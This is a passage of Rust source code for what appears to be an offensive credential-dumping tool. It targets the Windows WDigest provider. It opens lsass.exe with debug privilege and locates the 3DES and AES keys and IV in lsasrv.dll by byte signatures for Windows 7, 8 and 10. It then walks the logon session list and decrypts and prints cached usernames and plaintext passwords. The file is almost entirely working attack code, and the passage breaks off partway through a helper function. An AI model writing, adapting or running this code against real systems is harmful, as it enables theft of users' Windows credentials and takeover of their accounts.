use crate::utilities::Utils;

use winapi::um::processthreadsapi::OpenProcess;

use winapi::shared::minwindef::{
    DWORD, 
    FALSE, 
    LPVOID, 
    HMODULE, 
    USHORT, 
    PUCHAR, 
    PBYTE
};

use winapi::shared::ntdef::{
    NULL, 
    ULONG
};

use winapi::um::winnt::{
    HANDLE,
    PVOID, 
    PROCESS_VM_READ,
    PROCESS_QUERY_INFORMATION,
    LUID
};

use winapi::um::memoryapi::ReadProcessMemory;

use winapi::um::psapi::{
    EnumProcessModulesEx, 
    GetModuleFileNameExA
};

use winapi::um::libloaderapi::LoadLibraryW;

use sysinfo::{
    ProcessExt, 
    System, 
    SystemExt
};

use std::convert::TryInto;
use byteorder::ByteOrder;
use std::ptr::null_mut;

use anyhow::{
    anyhow, 
    Result
};

use winapi::shared::bcrypt::{
    MS_PRIMITIVE_PROVIDER, 
    BCryptOpenAlgorithmProvider, 
    BCryptSetProperty, 
    BCryptGenerateSymmetricKey, 
    BCryptDecrypt, 
    BCRYPT_ALG_HANDLE, 
    BCRYPT_KEY_HANDLE, 
    BCRYPT_AES_ALGORITHM, 
    BCRYPT_3DES_ALGORITHM
};

use winapi::shared::bcrypt::{
    BCRYPT_CHAIN_MODE_CFB, 
    BCRYPT_CHAIN_MODE_CBC, 
    BCRYPT_CHAINING_MODE
};

use winreg::{
    enums::*, 
    RegKey
};

use std::io::Error;
use std::process;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::u32;

const LOG_SESS_LIST_SIGNATURE: [u8; 4] = [72, 59, 217, 116];

const WIN10_LSAINITIALIZE_PROTECT_MEMORY_KEY: [u8; 16] = [131, 100, 36, 48, 0, 72, 141, 69, 224, 68, 139, 77, 216, 72, 141, 21];
const WIN8_LSAINITIALIZE_PROTECT_MEMORY_KEY: [u8; 12] = [131, 100, 36, 48, 0, 68, 139, 77, 216, 72, 139, 13];
const WIN7_LSAINITIALIZE_PROTECT_MEMORY_KEY: [u8; 13] = [131, 100, 36, 48, 0, 68, 139, 76, 36, 72, 72, 139, 13];

static mut WIN_G_INITIALIZATION_VECTOR: [u8; 16] = [0; 16];
static mut WIN_G_DES_KEY: [u8; 24] = [0; 24];
static mut WIN_G_AESKEY: [u8; 16] = [0; 16];

static USERNAME_OFFSET: u8 = 48;
static HOSTNAME_OFFSET: u8 = 64;
static PASSWORD_OFFSET: u8 = 80;

#[repr(C)]
#[derive(Copy, Clone)]
struct RustWDigest {
    flink: *mut RustWDigest,
    blink: *mut RustWDigest,
    usagecount: ULONG,
    this: *mut RustWDigest,
    locally_unique_identifier: LUID,

    username: Unicode,
    domain: Unicode,
    password: Unicode
}

#[repr(C)]
#[derive(Copy, Clone)]
struct Unicode {
    length: USHORT,
    maximum_length: USHORT,
    buffer: [u8; 32]
}

#[repr(C)]
#[derive(Copy, Clone, Debug)]
struct RustHardKey {
    cbsecret: ULONG,
    data: [u8; 32]
}

#[repr(C)]
#[derive(Copy, Clone, Debug)]
struct RustBcryptKey81 {
    size: ULONG,
    tag: ULONG,
    r#type: ULONG,
    unk0: ULONG,
    unk1: ULONG,
    unk2: ULONG,
    unk3: ULONG,
    unk4: ULONG,
    unk5: PVOID,
    unk6: ULONG,
    unk7: ULONG,
    unk8: ULONG,
    unk9: ULONG,
    hardkey: RustHardKey
}

#[repr(C)]
#[derive(Copy, Clone, Debug)]
struct RustBcryptHandleKey {
    size: ULONG,
    tag: ULONG,
    h_algorithm: PVOID, 
    key: RustBcryptKey81,
    unk0: PVOID
}

#[repr(C)]
#[derive(Copy, Clone, Debug)]
struct RustBcryptKey {
    size: ULONG,
    tag: ULONG,
    r#type: ULONG,
    unk0: ULONG,
    unk1: ULONG,
    bits: ULONG,
    hardkey: RustHardKey
}

pub struct Wdigest;

impl Wdigest {
    pub fn grab() -> Result<()> {
        if !Utils::is_elevated() {
            println!("[-] Program requires atleast administrative permissions");
            return Ok(());
        }
        let (debug_boolean, debug_result) = Utils::enable_debug_privilege();
        if debug_boolean {
            println!("{}", debug_result);

            let lsass_pid = get_process_pid("lsass");
            if let Ok(handle) = get_process_handle(lsass_pid) {
                println!("[+] Opened handle to lsass.exe");
                let (enum_lsass_boolean, _enum_lsass_result) = enumerate_lsass_dlls(handle);
                if enum_lsass_boolean {

                    if let Ok(os_version) = get_os_version() {
                        println!("[+] OS version found: {}", os_version);
                    }
                    match get_os_flag() {
                        1 => {
                            if let Ok(_) = find_keys_on_win7(handle) {
                                if let Ok(_) = find_credentials(handle) {
                                }
                            }
                        },
                        2 => {
                            if let Ok(_) = find_keys_on_win8(handle) {
                                if let Ok(_) = find_credentials(handle) {
                                }
                            }
                        },
                        3 => {
                            if let Ok(_) = find_keys_on_win10(handle) {
                                if let Ok(_) = find_credentials(handle) {
                                }
                            }
                        },
                        _ => {
                            println!("[x] Could not determine OS version");
                        }
                    }
                }
            } else {
                if let Err(e) = get_process_handle(lsass_pid) {
                    println!("{}", e);
                }
            }

        } else {
            println!("{}", debug_result);
        }

        Ok(())
    }
}

fn get_process_handle(process_id: DWORD) -> Result<HANDLE, Error> {
    unsafe {
        let process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, process_id);
        if process == NULL {
            Err(Error::last_os_error())
        } else {
            Ok(process)
        }
    }
}

fn enumerate_lsass_dlls(handle: HANDLE) -> (bool, String) {
    let mut lsass_process_information: Vec<&str> = Vec::new();
    let mut wdigest_dll_information: Vec<&str> = Vec::new();
    let mut lsasrv_dll_information: Vec<&str> = Vec::new();

    let lsass_dlls = get_process_dlls(handle);
    if !lsass_dlls.contains("lsass.exe") {
        return (false, format!("[-] could not find lsass.exe in lsass process"));
    } else if !lsass_dlls.contains("wdigest.DLL") {
        return (false, format!("[-] could not find wdigest.DLL in lsass process"));
    } else if !lsass_dlls.contains("lsasrv.dll") {
        return (false, format!("[-] could not find lsasrv.dll in lsass process"));
    }

    let dll_names_address: Vec<&str> = lsass_dlls.split("\n").collect();

    for dll_memory in dll_names_address {
        if dll_memory.contains("lsass.exe") {
            let lsass_process: Vec<&str> = dll_memory.split(":::").collect();
            lsass_process_information.push(lsass_process[0]);
            lsass_process_information.push(lsass_process[1]);
        } else if dll_memory.contains("wdigest.DLL") {
            let wdigest_dll: Vec<&str> = dll_memory.split(":::").collect();
            wdigest_dll_information.push(wdigest_dll[0]);
            wdigest_dll_information.push(wdigest_dll[1]);
        } else if dll_memory.contains("lsasrv.dll") {
            let lsasrv_dll: Vec<&str> = dll_memory.split(":::").collect();
            lsasrv_dll_information.push(lsasrv_dll[0]);
            lsasrv_dll_information.push(lsasrv_dll[1]);
        }
    }

    return (true, format!("\n[*] lsass.exe found at: {}\n\r[*] wdigest.dll found at: {}\n\r[*] lsasrv.dll found at: {}\n\r", lsass_process_information[1], wdigest_dll_information[1], lsasrv_dll_information[1]));
}

fn get_process_pid(process_name: &str) -> u32 {
    let sys = System::new_all();

    for (pid, process) in sys.get_processes() {
        let process = format!("{}::{}", pid, process.name());
        if process.contains(process_name) {
            return *pid as u32;
        }
    }
    return 0;
}

fn to_u32(input: &str) -> u32 {
    let _output = match input.parse::<u32>() {
        Ok(_output) => return _output,
        Err(_) => return 0,
    };
}

fn get_os_version() -> Result<String> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let cur_ver = hklm.open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")?;
    let productname: String = cur_ver.get_value("ProductName")?;

    return Ok(format!("{}", productname));
}

//We get this flag so it's easier (since some OS's have the same flags)
fn get_os_flag() -> usize {
    if let Ok(os) = get_os_version() {
        if os.contains("10") || os.contains("2016") || os.contains("2019") {
            return 3;
        } else if os.contains("7") || os.contains("2008 RS") {
            return 1;
        } else if os.contains("Vista") || os.contains("2008") {
            return 1;
        } else if os.contains("8") || os.contains("2012") {
            return 2;
        } else {
            return 0;
        }
    }
    return 0;
}

fn load_dll_into_process(name: &str) -> String {
    unsafe {
        let wide_filename: Vec<u16> = OsStr::new(name).encode_wide().chain(Some(0)).collect();

        let dll_load = LoadLibraryW(wide_filename.as_ptr());
        if dll_load != null_mut() {
            let handle_current = get_current_process_handle();

            let current_process_dlls = get_process_dlls(handle_current);
            let process_dll_results: Vec<&str> = current_process_dlls.split("\n").collect();

            for dll in process_dll_results {
                if dll.contains(name) {
                    let process_information: Vec<&str> = dll.split(":::").collect();
                    println!("\n[+] Locally loaded {} at: {}", name, process_information[1]);
                    return format!("[+] loaded {}:::{}", name, dll_load as usize);
                }
            }
        } else {
            return format!("[-] Found error: {}", Error::last_os_error());
        }

        return format!("[-] Unable to find {} in current process", name);
    }
}

fn find_credentials(lsass_handle: HANDLE) -> Result<bool> {
    let result = load_dll_into_process("wdigest.dll");
    if result.contains("[-]") {
        println!("{}", result);
    }
    
    let handle_current = get_current_process_handle();
    
    let wdigest_location: Vec<&str> = result.split(":::").collect();
    let log_sess_list_sig_offset = search_pattern(to_usize_from_string(wdigest_location[1]), LOG_SESS_LIST_SIGNATURE.as_ptr() as usize, LOG_SESS_LIST_SIGNATURE.len(), &LOG_SESS_LIST_SIGNATURE, handle_current);
    if log_sess_list_sig_offset == 0 {
        println!("[-] Unable to get the offset for l_LogSessList");
        return Err(anyhow!("{}", false));
    }
    println!("[+] Found offset to l_LogSessList at: {}\n", (log_sess_list_sig_offset as usize));

    let log_sess_list_offset = get_win_offset(handle_current, to_usize_from_string(wdigest_location[1]) + log_sess_list_sig_offset - 4 ,4); 
    let log_sess_list_addr = get_log_sess_list_addr(lsass_handle, to_usize_from_string(wdigest_location[1]) + log_sess_list_sig_offset + log_sess_list_offset);

    unsafe {
        let mut entry = RustWDigest {
            flink: std::mem::zeroed(),
            blink: std::mem::zeroed(),
            usagecount: std::mem::zeroed(),
            this: std::mem::zeroed(),
            locally_unique_identifier: std::mem::zeroed(),
            username: std::mem::zeroed(),
            domain: std::mem::zeroed(),
            password: std::mem::zeroed()
        };

        read_from_lsass(lsass_handle, log_sess_list_addr as usize, &mut any_as_u8_slice(&mut entry), 88);

        let ll_current: &[u8] = &mut any_as_u8_slice(&mut entry.this).to_owned();

        libc::memset(any_as_u8_slice(&mut entry) as *mut _ as *mut core::ffi::c_void, 0, 88);
        read_from_lsass(lsass_handle, byteorder::LittleEndian::read_u64(&ll_current) as usize, &mut any_as_u8_slice(&mut entry), 88);

        if entry.usagecount == 1 {
            let username = extract_unicode_string(lsass_handle, byteorder::LittleEndian::read_u64(&ll_current) as usize + USERNAME_OFFSET as usize);
            let hostname = extract_unicode_string(lsass_handle, byteorder::LittleEndian::read_u64(&ll_current) as usize + HOSTNAME_OFFSET as usize);
            let mut password = extract_unicode_string(lsass_handle, byteorder::LittleEndian::read_u64(&ll_current) as usize + PASSWORD_OFFSET as usize);

            if username.length != 0 {
                println!("[-->] Username: {}", bytes_to_string(&username.buffer));
            } else {
                println!("[-->] Username: [NULL]");
            }

            if hostname.length != 0 {
                println!("[-->] Hostname: {}", bytes_to_string(&hostname.buffer));
            } else {
                println!("[-->] Hostname: [NULL]");
            }
            
            if password.length != 0 && (password.length % 2) == 0 {
                let mut buffer = [0; 32];
                decrypt_credentials(&mut password.buffer, password.maximum_length as u32, &mut buffer, 32);
                println!("[-->] Password: {}", bytes_to_string(&buffer));
            } else {
                println!("[-->] Password: [NULL]");
            }
        }
    }

    return Ok(true);
}

fn get_log_sess_list_addr(handle: HANDLE, address: usize) -> u64 {
    let mut buffer = [0; 8];
    if let Ok(_) = read_memory_bytes(handle, address, &mut buffer, 8) {    
    }
    return u64::from_le_bytes(buffer);
}

fn decrypt_credentials(encrypted_pass: &mut [u8], encrypted_pass_len: DWORD, decrypted_pass: &mut [u8], decrypted_pass_len: ULONG) {
    unsafe {
        let mut h_aes_provider: BCRYPT_ALG_HANDLE = std::mem::zeroed();
        let mut h_des_provider: BCRYPT_ALG_HANDLE = std::mem::zeroed();

        let mut h_aes: BCRYPT_KEY_HANDLE = std::mem::zeroed();
        let mut h_des: BCRYPT_KEY_HANDLE = std::mem::zeroed();

        let mut result: ULONG = std::mem::zeroed();

        let mut initialization_vector: [u8; 16] = WIN_G_INITIALIZATION_VECTOR;

        if encrypted_pass_len % 8 == 0 {
            // If suited to 3DES
            println!("[-->] 3DES");
            BCryptOpenAlgorithmProvider(&mut h_des_provider, to_wchar(BCRYPT_3DES_ALGORITHM).as_mut_ptr(), to_wchar(MS_PRIMITIVE_PROVIDER).as_mut_ptr(), 0);
            BCryptSetProperty(h_des_provider, to_wchar(BCRYPT_CHAINING_MODE).as_mut_ptr(), to_wchar(BCRYPT_CHAIN_MODE_CBC).as_mut_ptr() as PBYTE, 24, 0);
            BCryptGenerateSymmetricKey(h_des_provider, &mut h_des, 0 as *mut u8, 0, WIN_G_DES_KEY.as_ptr() as *mut u8, WIN_G_DES_KEY.len() as u32, 0);
            BCryptDecrypt(h_des, encrypted_pass as *const _ as PUCHAR, encrypted_pass_len, 0 as *mut winapi::ctypes::c_void, initialization_vector.as_mut_ptr(), 8, decrypted_pass.as_mut_ptr(), decrypted_pass_len, &mut result, 0);
        } else {
            // If suited to AES
            println!("[-->] AES");
            BCryptOpenAlgorithmProvider(&mut h_aes_provider, to_wchar(BCRYPT_AES_ALGORITHM).as_mut_ptr(), to_wchar(MS_PRIMITIVE_PROVIDER).as_mut_ptr(), 0);
            BCryptSetProperty(h_aes_provider, to_wchar(BCRYPT_CHAINING_MODE).as_mut_ptr(), to_wchar(BCRYPT_CHAIN_MODE_CFB).as_mut_ptr() as PBYTE, 32, 0);
            BCryptGenerateSymmetricKey(h_aes_provider, &mut h_aes, 0 as *mut u8, 0, WIN_G_AESKEY.as_ptr() as *mut u8, WIN_G_AESKEY.len() as u32, 0);
            BCryptDecrypt(h_aes, encrypted_pass as *const _ as PUCHAR, encrypted_pass_len, 0 as *mut winapi::ctypes::c_void, initialization_vector.as_mut_ptr(), initialization_vector.len() as u32, decrypted_pass.as_mut_ptr(), decrypted_pass_len, &mut result, 0);
        }
    }
}

fn to_wchar(str : &str) -> Vec<u16> {
    OsStr::new(str).encode_wide(). chain(Some(0).into_iter()).collect()
}

fn bytes_to_string(input: &[u8]) -> String {
    match std::str::from_utf8(&input) {
        Ok(string) => return string.replace("\u{0}", "").to_string(),
        Err(_) => return format!("Failed to decode string"),
    };
}

fn extract_unicode_string(lsass_handle: HANDLE, addr: usize) -> Unicode {
    unsafe {
        let mut string = Unicode{
            length: std::mem::zeroed(),
            maximum_length: std::mem::zeroed(),
            buffer: std::mem::zeroed(),
        };

        read_from_lsass(lsass_handle, addr as usize, &mut any_as_u8_slice(&mut string), 16);

        let mut buffer = [0; 32];
        read_from_lsass(lsass_handle, (*((any_as_u8_slice(&mut string) as *const _ as *const std::os::raw::c_char as usize + 8) as *mut *mut std::ffi::c_void)) as usize, &mut buffer ,(string).maximum_length as usize);

        (string.buffer) = buffer;
        return string;
    }
}

fn find_keys_on_win7(lsass_handle: HANDLE) -> Result<bool> {
    unsafe {
        let iv_offset = 59;
        let _des_offset_memory = -61;
        let aes_offset = 25;

        let result = load_dll_into_process("lsasrv.dll");
        if result.contains("[-]") {
            return Err(anyhow!("{}", false));
        }

        let memory: Vec<&str> = result.split(":::").collect();
        let dll_memory_start = to_usize_from_string(memory[1]);

        let handle_current = get_current_process_handle();

        let key_sig_offset = search_pattern(dll_memory_start, WIN7_LSAINITIALIZE_PROTECT_MEMORY_KEY.as_ptr() as usize, WIN7_LSAINITIALIZE_PROTECT_MEMORY_KEY.len(), &WIN7_LSAINITIALIZE_PROTECT_MEMORY_KEY, handle_current);
        if key_sig_offset == 0 {
            println!("[-] Unable to get the offset for AES/3Des/IV keys");
            return Err(anyhow!("{}", false));
        }
        println!("\n[+] Found offset to AES/3Des/IV at: {}", (key_sig_offset as usize));

        let win_iv_offset = get_win_offset(handle_current, dll_memory_start + key_sig_offset + iv_offset, 4);
        println!("[+] InitializationVector offset found as {}\n", win_iv_offset);

        get_win_iv_contents(lsass_handle, dll_memory_start + key_sig_offset + iv_offset + 4 + win_iv_offset);
        println!("[+] InitializationVector recovered as:");
    	println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_INITIALIZATION_VECTOR);
        println!("[*] ====[ Final ]==== [*]");
        
        let win_des_offset = get_win_offset(handle_current, add(dll_memory_start + key_sig_offset, _des_offset_memory).unwrap(), 4);
        println!("\n[+] h3DesKey offset found as: {}\n", win_des_offset);

        let mut buffer = [0;8];
        read_memory_bytes(lsass_handle, add(dll_memory_start + key_sig_offset + 4 + win_des_offset, _des_offset_memory).unwrap(), &mut buffer, 8)?;
        let key_pointer = u64::from_le_bytes(buffer);

        get_win_deskey_contents(lsass_handle, key_pointer as usize, true);
        println!("[+] 3Des Key recovered as:");
        println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_DES_KEY);
        println!("[*] ====[ Final ]==== [*]");

        let win_aes_offset = get_win_offset(handle_current, dll_memory_start + key_sig_offset + aes_offset, 4);
        println!("\n[+] hAesKey offset found as: {}\n", win_aes_offset);

        let mut aes_buffer = [0; 8];
        read_memory_bytes(lsass_handle, dll_memory_start + key_sig_offset + aes_offset + 4 + win_aes_offset, &mut aes_buffer, 8)?;
        let key_pointer = u64::from_le_bytes(aes_buffer);

        get_win_aeskey_contents(lsass_handle, key_pointer as usize, true);
        println!("[+] AES Key recovered as:");
        println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_AESKEY);
        println!("[*] ====[ Final ]==== [*]");

        Ok(true)
    }
}

fn find_keys_on_win8(lsass_handle: HANDLE) -> Result<bool> {
    unsafe {
        let result = load_dll_into_process("lsasrv.dll");
        if result.contains("[-]") {
            return Err(anyhow!("{}", false));
        }

        let memory: Vec<&str> = result.split(":::").collect();
        let dll_memory_start = to_usize_from_string(memory[1]);

        let _iv_offset_memory = 62 as usize;
        let _des_offset_memory = -70;
        let _aes_offset_memory = 23 as usize;

        let handle_current = get_current_process_handle();

        let key_sig_offset = search_pattern(dll_memory_start, WIN8_LSAINITIALIZE_PROTECT_MEMORY_KEY.as_ptr() as usize, WIN8_LSAINITIALIZE_PROTECT_MEMORY_KEY.len(), &WIN8_LSAINITIALIZE_PROTECT_MEMORY_KEY, handle_current);
        if key_sig_offset == 0 {
            println!("[-] Unable to get the offset for AES/3Des/IV keys");
            return Err(anyhow!("{}", false));
        }
        println!("\n[+] Found offset to AES/3Des/IV at: {}", (key_sig_offset as usize));

        let win_iv_offset = get_win_offset(handle_current, dll_memory_start + key_sig_offset + _iv_offset_memory, 4);
        println!("[+] InitializationVector offset found as {}\n", win_iv_offset);

        get_win_iv_contents(lsass_handle, dll_memory_start + key_sig_offset + _iv_offset_memory + 4 + win_iv_offset);
        println!("[+] InitializationVector recovered as:");
    	println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_INITIALIZATION_VECTOR);
        println!("[*] ====[ Final ]==== [*]");

        let win10_des_offset = get_win_offset(handle_current, add(dll_memory_start + key_sig_offset, _des_offset_memory).unwrap(), 4);
        println!("\n[+] h3DesKey offset found as: {}\n", win10_des_offset);

        let mut buffer = [0; 8];
        read_memory_bytes(lsass_handle, add(dll_memory_start + key_sig_offset + 4 + win10_des_offset, _des_offset_memory).unwrap(), &mut buffer, 8)?;
        let key_pointer = u64::from_le_bytes(buffer);

        get_win_deskey_contents(lsass_handle, key_pointer as usize, true);
        println!("[+] 3Des Key recovered as:");
        println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_DES_KEY);
        println!("[*] ====[ Final ]==== [*]");

        let win10_aes_offset = get_win_offset(handle_current, dll_memory_start + key_sig_offset + _aes_offset_memory, 4);
        println!("\n[+] hAesKey offset found as: {}\n", win10_aes_offset);

        let mut aes_buffer = [0; 8];
        read_memory_bytes(lsass_handle, dll_memory_start + key_sig_offset + _aes_offset_memory + 4 + win10_aes_offset, &mut aes_buffer, 8)?;
        let key_pointer = u64::from_le_bytes(aes_buffer);

        get_win_aeskey_contents(lsass_handle, key_pointer as usize, true);
        println!("[+] AES Key recovered as:");
        println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_AESKEY);
        println!("[*] ====[ Final ]==== [*]");

        Ok(true)
    }
}

#[allow(overflowing_literals)]
fn find_keys_on_win10(lsass_handle: HANDLE) -> Result<bool> {
    unsafe {
        let result = load_dll_into_process("lsasrv.dll");
        if result.contains("[-]") {
            return Err(anyhow!("{}", false));
        }

        let memory: Vec<&str> = result.split(":::").collect();
        let dll_memory_start = to_usize_from_string(memory[1]);

        let _iv_offset_memory = 61 as usize;
        let _des_offset_memory = -73;
        let _aes_offset_memory = 16 as usize;

        let handle_current = get_current_process_handle();

        let key_sig_offset = search_pattern(dll_memory_start, WIN10_LSAINITIALIZE_PROTECT_MEMORY_KEY.as_ptr() as usize, WIN10_LSAINITIALIZE_PROTECT_MEMORY_KEY.len(), &WIN10_LSAINITIALIZE_PROTECT_MEMORY_KEY, handle_current);
        if key_sig_offset == 0 {
            println!("[-] Unable to get the offset for AES/3Des/IV keys");
            return Err(anyhow!("{}", false));
        }
        println!("\n[+] Found offset to AES/3Des/IV at: {}", (key_sig_offset as usize));

        let win_iv_offset = get_win_offset(handle_current, dll_memory_start + key_sig_offset + _iv_offset_memory, 4);
        println!("[+] InitializationVector offset found as {}\n", win_iv_offset);

        get_win_iv_contents(lsass_handle, dll_memory_start + key_sig_offset + _iv_offset_memory + 4 + win_iv_offset);
        println!("[+] InitializationVector recovered as:");
    	println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_INITIALIZATION_VECTOR);
        println!("[*] ====[ Final ]==== [*]");

        let win10_des_offset = get_win_offset(handle_current, add(dll_memory_start + key_sig_offset, _des_offset_memory).unwrap(), 4);
        println!("\n[+] h3DesKey offset found as: {}\n", win10_des_offset);

        let mut buffer = [0; 8];
        read_memory_bytes(lsass_handle, add(dll_memory_start + key_sig_offset + 4 + win10_des_offset, _des_offset_memory).unwrap(), &mut buffer, 8)?;
        let key_pointer = u64::from_le_bytes(buffer);

        get_win_deskey_contents(lsass_handle, key_pointer as usize, false);
        println!("[+] 3Des Key recovered as:");
        println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_DES_KEY);
        println!("[*] ====[ Final ]==== [*]");

        let win10_aes_offset = get_win_offset(handle_current, dll_memory_start + key_sig_offset + _aes_offset_memory, 4);
        println!("\n[+] hAesKey offset found as: {}\n", win10_aes_offset);

        let mut aes_buffer = [0; 8];
        read_memory_bytes(lsass_handle, dll_memory_start + key_sig_offset + _aes_offset_memory + 4 + win10_aes_offset, &mut aes_buffer, 8)?;
        let key_pointer = u64::from_le_bytes(aes_buffer);

        get_win_aeskey_contents(lsass_handle, key_pointer as usize, false);
        println!("[+] AES Key recovered as:");
        println!("[*] ====[ Start ]==== [*] ");
        println!("[*] {:?}", WIN_G_AESKEY);
        println!("[*] ====[ Final ]==== [*]");

        Ok(true)
    }
}

fn get_win_deskey_contents(lsass_handle: HANDLE, key_pointer: usize, win7: bool) {
    unsafe {
        if win7 {
            let mut h3_des_key_struct: RustBcryptHandleKey = std::mem::zeroed();
            let mut extracted3_des_key: RustBcryptKey = std::mem::zeroed();

            read_from_lsass(lsass_handle, key_pointer as usize, &mut any_as_u8_slice(&mut h3_des_key_struct), 32);
            let bytes: &[u8] = any_as_u8_slice(&mut h3_des_key_struct.key);

            read_from_lsass(lsass_handle, byteorder::LittleEndian::read_u64(&bytes) as usize ,&mut any_as_u8_slice(&mut extracted3_des_key), 88);

            if extracted3_des_key.hardkey.cbsecret == 24 {
                for i in 0..extracted3_des_key.hardkey.cbsecret {
                    WIN_G_DES_KEY[i as usize] = extracted3_des_key.hardkey.data[i as usize];
                }
            }
        } else {
            let mut h3_des_key_struct: RustBcryptHandleKey = std::mem::zeroed();
            let mut extracted3_des_key: RustBcryptKey81 = std::mem::zeroed();

            read_from_lsass(lsass_handle, key_pointer as usize, &mut any_as_u8_slice(&mut h3_des_key_struct), 32);
            let bytes: &[u8] = any_as_u8_slice(&mut h3_des_key_struct.key);

            read_from_lsass(lsass_handle, byteorder::LittleEndian::read_u64(&bytes) as usize ,&mut any_as_u8_slice(&mut extracted3_des_key), 88);

            if extracted3_des_key.hardkey.cbsecret == 24 {
                for i in 0..extracted3_des_key.hardkey.cbsecret {
                    WIN_G_DES_KEY[i as usize] = extracted3_des_key.hardkey.data[i as usize];
                }
            }
        }
    }
}

fn get_win_aeskey_contents(handle: HANDLE, key_pointer: usize, win7: bool) {
    unsafe {
        if win7 {
            let mut h_aes_key_struct: RustBcryptHandleKey = std::mem::zeroed();
            let mut extracted_aes_key: RustBcryptKey = std::mem::zeroed();

            read_from_lsass(handle, key_pointer, &mut any_as_u8_slice(&mut h_aes_key_struct), 32);
            let bytes: &[u8] = any_as_u8_slice(&mut h_aes_key_struct.key);

            read_from_lsass(handle, byteorder::LittleEndian::read_u64(&bytes) as usize ,&mut any_as_u8_slice(&mut extracted_aes_key), 88);

            if extracted_aes_key.hardkey.cbsecret == 16 {
                for i in 0..extracted_aes_key.hardkey.cbsecret {
                    WIN_G_AESKEY[i as usize] = extracted_aes_key.hardkey.data[i as usize];
                }
            }
        } else {
            let mut h_aes_key_struct: RustBcryptHandleKey = std::mem::zeroed();
            let mut extracted_aes_key: RustBcryptKey81 = std::mem::zeroed();

            read_from_lsass(handle, key_pointer, &mut any_as_u8_slice(&mut h_aes_key_struct), 32);
            let bytes: &[u8] = any_as_u8_slice(&mut h_aes_key_struct.key);

            read_from_lsass(handle, byteorder::LittleEndian::read_u64(&bytes) as usize ,&mut any_as_u8_slice(&mut extracted_aes_key), 88);

            if extracted_aes_key.hardkey.cbsecret == 16 {
                for i in 0..extracted_aes_key.hardkey.cbsecret {
                    WIN_G_AESKEY[i as usize] = extracted_aes_key.hardkey.data[i as usize];
                }
            }
        }
    }
}

unsafe fn any_as_u8_slice<T: Sized>(p: &mut T) -> &mut [u8] {
    ::std::slice::from_raw_parts_mut(
        (p as *mut T) as *mut u8,
        ::std::mem::size_of::<T>(),
    )
}

fn get_win_iv_contents(handle: HANDLE, address: usize) {
    let address = format!("{:#X}", address).replace("0x", "");
    let usize_address = address_to_usize(&address);

    unsafe {read_from_lsass(handle, usize_address, &mut WIN_G_INITIALIZATION_VECTOR, 16)};
}

fn read_from_lsass(lsass_handle: HANDLE, address: usize, mut buffer: &mut [u8], mem_len: usize) {
    if let Ok(_result) = read_memory(lsass_handle as *mut core::ffi::c_void, address, &mut buffer, mem_len) {
    }
}

fn read_memory_bytes(handle: HANDLE, address: usize, mem_out: &mut [u8], mem_out_len: usize) -> Result<usize> {
    unsafe {
        let bytes_read = std::mem::zeroed();

        if kernel32::ReadProcessMemory(
            handle as *mut libc::c_void,
            address as *mut core::ffi::c_void,
            mem_out.as_mut_ptr() as *mut core::ffi::c_void,
            mem_out_len.try_into().unwrap(),
            bytes_read,
        ) == 0 {
            return Ok(bytes_read as usize)
        }
        return Ok(bytes_read as usize)
    }
}

fn get_current_process_handle() -> HANDLE {
    if let Ok(handle) = get_process_handle(to_u32(&format!("{}", process::id()))) {
        return handle;
    } else {
        return null_mut();
    };
}

fn read_memory(handle_process: *mut core::ffi::c_void, address: usize, mem_out: &mut [u8], mem_out_len: usize) -> Result<i32, Error> {
    unsafe {
        let reading =  kernel32::ReadProcessMemory(handle_process as *mut core::ffi::c_void, address as *mut core::ffi::c_void, mem_out.as_mut_ptr() as *mut core::ffi::c_void, mem_out_len.try_into().unwrap(), null_mut());
        if reading == 0 {
            Err(Error::last_os_error())
        } else {
            Ok(reading)
        }
    }
}

fn add(u: usize, i: i32) -> Option<usize> {
    if i.is_negative() {
        u.checked_sub(i.wrapping_abs() as u32 as usize)
    } else {
        u.checked_add(i as usize)
    }
}

fn read_offset(handle_process: HANDLE, address: usize, mem_out: &mut [u8], mem_out_len: usize) {
    unsafe {
        libc::memset(mem_out.as_mut_ptr() as *mut core::ffi::c_void, 0, mem_out_len);
        ReadProcessMemory(handle_process, address as LPVOID, mem_out.as_mut_ptr() as LPVOID, mem_out_len, null_mut());
    }
}

fn address_to_usize(input: &str) -> usize {
    match usize::from_str_radix(&input.replace("0x", "").to_lowercase(), 16) {
        Ok(usize_address) => return usize_address,
        Err(_) => return 0,
    };
}

fn to_usize_from_string(input: &str) -> usize {
    let _output = match input.to_string().parse::<usize>() {
        Ok(_output) => return _output,
        Err(_) => return 0,
    };
}

fn get_single_byte(process: HANDLE, addr: usize) -> u8 {
    let result = match read_memory_single_byte(process, addr) {
        Ok(mut result) => result.remove(0),
        Err(_e) => {
            0_u8
        },  
    };

    return result;
}

fn read_memory_single_byte(process_handle: HANDLE, addr: usize) -> Result<Vec<u8>, Error> {
    let mut buffer = Vec::new();
    unsafe {
        for _i in 1..3 {
            let res = ReadProcessMemory(process_handle, addr as LPVOID, buffer.as_mut_ptr() as LPVOID, buffer.len(), null_mut());
            if res == FALSE {
                continue;
            } else {
                buffer.push(res as u8);
            }
        }
        return Ok(buffer)
    }
}

fn get_win_offset(handle_lsass: HANDLE, address: usize, mem_len: usize) -> usize {
    let mut buffer = [0; 4];
    read_offset(handle_lsass, address, &mut buffer, mem_len);
    return u32::from_le_bytes(buffer) as usize;
}

fn get_process_dlls(process_handle: HANDLE) -> String {
    unsafe {
        let sizeof_hmodule = std::mem::size_of::<HMODULE>();

        let mut modules = {
            let mut bytes_needed: DWORD = 0;
            let enum_process_modules = EnumProcessModulesEx(process_handle, null_mut(), 0, &mut bytes_needed, 0x03);
            if enum_process_modules != FALSE {
                let num_entries_needed = bytes_needed as usize / sizeof_hmodule;
                let mut modules = Vec::<HMODULE>::with_capacity(num_entries_needed);
